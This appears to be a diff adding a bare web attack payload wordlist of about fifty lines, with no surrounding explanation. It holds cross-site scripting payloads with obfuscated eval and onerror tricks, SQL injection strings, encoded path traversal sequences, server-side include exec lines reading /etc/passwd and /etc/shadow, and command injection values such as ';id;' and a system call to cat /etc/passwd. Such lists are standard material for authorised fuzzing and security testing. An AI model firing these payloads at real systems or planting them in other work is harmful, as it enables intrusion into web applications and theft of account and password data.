@@ -1,0 +1,51 @@
+-prompt($)-
+-prompt($)-
+;a=prompt,a()//
+;a=prompt,a()//
+-eval("window['pro'%2B'mpt'](8)")-
+-eval("window['pro'%2B'mpt'](8)")-
+onclick=prompt($)">x.y
+<image src =q onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
+</script/script><img src =q onerror=prompt(8)>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+"""><\x3Cscript>javascript:alert(1)</script>
+"><\x00script>javascript:alert(1)</script>
+" or "
+-- or #
+' OR '1
+' OR 1 -- -
+' OR "" = "
+' OR 1 = 1 -- -
+' OR '' = '
+../
+..\
+..\/
+%252e%252e%252f
+%252e%252e%252f
+%c0%ae%c0%ae%c0%af
+%uff0e%uff0e%u2215
+%uff0e%uff0e%u2216
+"-"
+'LIKE'
+"="
+OR 1=1
+' OR "x"="x
+-- AND 1=1$ NULL; --
+******************UNION SELECT '2
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;-->&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;-->&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;-->&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;-->&gt;
+/index.html|id|
+;id;
+;id
+;netstat -a;
+;system("cat%20/etc/passwd")
+;id;
